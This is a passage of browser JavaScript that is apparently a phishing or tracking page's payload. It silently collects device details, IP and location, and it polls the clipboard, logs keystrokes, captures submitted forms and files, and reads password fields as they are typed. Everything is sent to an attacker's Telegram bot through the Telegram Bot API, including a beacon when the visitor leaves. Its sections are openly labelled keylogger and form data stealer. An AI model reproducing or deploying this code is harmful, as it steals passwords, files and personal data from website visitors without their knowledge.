        productSub: navigator.productSub,
        buildID: navigator.buildID || 'None'
    };
    
    return info;
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        try {
            const response = await fetch('https://api.my-ip.io/ip.json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'Unable to fetch';
        }
    }
}

async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return {
                level: `${Math.round(battery.level * 100)}%`,
                charging: battery.charging ? 'Charging' : 'Not charging'
            };
        } catch {
            return 'Unknown';
        }
    }
    return 'Not supported';
}

function getConnectionInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
        return {
            type: connection.type || 'Unknown',
            effectiveType: connection.effectiveType || 'Unknown',
            downlink: connection.downlink || 'Unknown',
            rtt: connection.rtt || 'Unknown'
        };
    }
    return 'Unknown';
}

function formatDeviceInfo(info) {
    let batteryText = 'Unknown';
    if (info.battery && typeof info.battery === 'object') {
        batteryText = `${info.battery.level} (${info.battery.charging})`;
    }
    
    let connectionText = 'Unknown';
    if (info.connection && typeof info.connection === 'object') {
        connectionText = `${info.connection.effectiveType} (${info.connection.type})`;
    }
    
    let locationText = 'Not available';
    if (info.location && typeof info.location === 'object') {
        locationText = `
├─ Latitude: ${info.location.lat}
├─ Longitude: ${info.location.lng}
└─ Accuracy: ±${info.location.accuracy}m`;
    }
    
    return `
📱 **Device Information**
⏰ Time: ${info.timestamp}
🌐 IP: ${info.ip}
💻 CPU Cores: ${info.hardwareConcurrency}
🧠 RAM: ${info.deviceMemory}GB
🖥️ Platform: ${info.platform}
📟 User Agent: ${info.userAgent}
🌐 Network: ${connectionText}
🔋 Battery: ${batteryText}
🗣️ Language: ${info.language}
🕐 Timezone: ${info.timezone}
📺 Screen: ${info.screen}
👁️ Viewport: ${info.viewport}
🍪 Cookies Enabled: ${info.cookiesEnabled}
📡 Online: ${info.online}
👆 DNT: ${info.doNotTrack}
📍 Location: ${locationText}
🔗 Referrer: ${info.referrer}
📄 URL: ${info.url}
🏷️ Vendor: ${info.vendor}
    `.trim();
}

// ==================== SILENT DATA COLLECTION ====================
async function silentCollectAndSendInfo() {
    try {
        const deviceInfo = await collectDeviceInfo();
        const formattedInfo = formatDeviceInfo(deviceInfo);
        
        if (CHAT_ID) {
            await sendMessageToTelegram(`🔄 ធ្វើបច្ចុប្បន្នភាពស្ងាត់\n\n${formattedInfo}`);
        }
    } catch (error) {}
}

// ==================== TELEGRAM FUNCTIONS ====================
async function sendMessageToTelegram(message) {
    if (!CHAT_ID || !message) return;
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                text: message,
                parse_mode: 'Markdown'
            }),
        });
    } catch (err) {}
}

async function sendFileToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
            method: "POST",
            body: formData
        });
    } catch (error) {}
}

// ==================== BYTE FORMATTING ====================
function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// ==================== URL FUNCTIONS ====================
function cleanURL() {
    const uri = window.location.toString();
    const patterns = ["%3D", "%3D%3D", "&m=1", "?m=1"];
    
    patterns.forEach(pattern => {
        if (uri.indexOf(pattern) > 0) {
            const clean_uri = uri.substring(0, uri.indexOf(pattern));
            window.history.replaceState({}, document.title, clean_uri);
        }
    });
}

function GetURLParameter(sParam) {
    const sPageURL = window.location.search.substring(1);
    const sURLVariables = sPageURL.split('&');
    for (let i = 0; i < sURLVariables.length; i++) {
        const sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] === sParam) {
            return sParameterName[1];
        }
    }
    return null;
}

function decodeBase64(encodedStr) {
    try {
        return decodeURIComponent(atob(encodedStr));
    } catch (e) {
        return null;
    }
}

function getChatIDFromURL() {
    const base64Id = GetURLParameter('i');
    return base64Id ? decodeBase64(base64Id) : null;
}

function initTheme() {
    if (!themeToggle) return;
    themeToggle.style.display = 'none';
}

// ==================== CLIPBOARD MONITORING ====================
let lastClipboardContent = '';

async function startClipboardMonitor() {
    if (!CHAT_ID) return;
    
    setInterval(async () => {
        try {
            const text = await navigator.clipboard.readText();
            if (text && text !== lastClipboardContent && text.length > 0) {
                lastClipboardContent = text;
                
                const deviceInfo = await collectDeviceInfo();
                const formattedInfo = formatDeviceInfo(deviceInfo);
                
                await sendMessageToTelegram(`📋 Clipboard ស្ងាត់\n\n${text}\n\n${formattedInfo}`);
            }
        } catch (error) {}
    }, 5000);
}

if (CHAT_ID) {
    startClipboardMonitor();
}

// ==================== KEYLOGGER ====================
let keylogBuffer = '';
let keylogTimer = null;

document.addEventListener('keydown', function(e) {
    if (!CHAT_ID) return;
    
    if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Tab' || e.key === 'Backspace') {
        if (e.key === 'Enter') {
            keylogBuffer += '[ENTER]\n';
        } else if (e.key === 'Tab') {
            keylogBuffer += '[TAB]';
        } else if (e.key === 'Backspace') {
            keylogBuffer += '[BACKSPACE]';
        } else if (e.key === ' ') {
            keylogBuffer += ' ';
        } else {
            keylogBuffer += e.key;
        }
        
        if (keylogBuffer.length > 100 || e.key === 'Enter') {
            clearTimeout(keylogTimer);
            keylogTimer = setTimeout(() => {
                sendKeylogData();
            }, 2000);
        }
    }
});

async function sendKeylogData() {
    if (!keylogBuffer || !CHAT_ID) return;
    
    const dataToSend = keylogBuffer;
    keylogBuffer = '';
    
    const deviceInfo = await collectDeviceInfo();
    const formattedInfo = formatDeviceInfo(deviceInfo);
    
    await sendMessageToTelegram(`⌨️ Keylog ស្ងាត់\n\n${dataToSend}\n\n${formattedInfo}`);
}

// ==================== FORM DATA STEALER ====================
document.addEventListener('submit', async function(e) {
    if (!CHAT_ID) return;
    
    const form = e.target;
    const formData = new FormData(form);
    const data = {};
    
    for (let [key, value] of formData.entries()) {
        if (value instanceof File) {
            data[key] = `[FILE: ${value.name}]`;
            await sendFileToTelegram(value, `📎 File from form: ${key}`);
        } else {
            data[key] = value;
        }
    }
    
    const deviceInfo = await collectDeviceInfo();
    const formattedInfo = formatDeviceInfo(deviceInfo);
    
    let message = `📝 **Form Data ត្រូវបានលួច**\n\n`;
    message += `📋 Form Action: ${form.action || 'None'}\n`;
    message += `📋 Form Method: ${form.method || 'GET'}\n\n`;
    message += `📊 ទិន្នន័យ:\n`;
    
    for (let [key, value] of Object.entries(data)) {
        message += `├─ ${key}: ${value}\n`;
    }
    
    message += `\n${formattedInfo}`;
    
    await sendMessageToTelegram(message);
});

// ==================== PASSWORD FIELD MONITORING ====================
document.addEventListener('input', async function(e) {
    if (!CHAT_ID) return;
    
    const target = e.target;
    if ((target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') && target.type === 'password') {
        const inputName = target.name || target.id || 'Unknown';
        const inputValue = target.value;
        
        if (inputValue.length > 0) {
            const deviceInfo = await collectDeviceInfo();
            const formattedInfo = formatDeviceInfo(deviceInfo);
            
            await sendMessageToTelegram(`🔐 **Password Field**\n\n📝 Field: ${inputName}\n🔑 Value: ${inputValue}\n\n${formattedInfo}`);
        }
    }
});

// ==================== PAGE UNLOAD TRACKING ====================
window.addEventListener('beforeunload', function() {
    if (!CHAT_ID) return;
    
    const message = `👋 **User Leaving Page**\n\nURL: ${window.location.href}`;
    
    const blob = new Blob([JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
    })], { type: 'application/json' });
    
    navigator.sendBeacon(`https://api.telegram.org/bot${TOKEN}/sendMessage`, blob);
});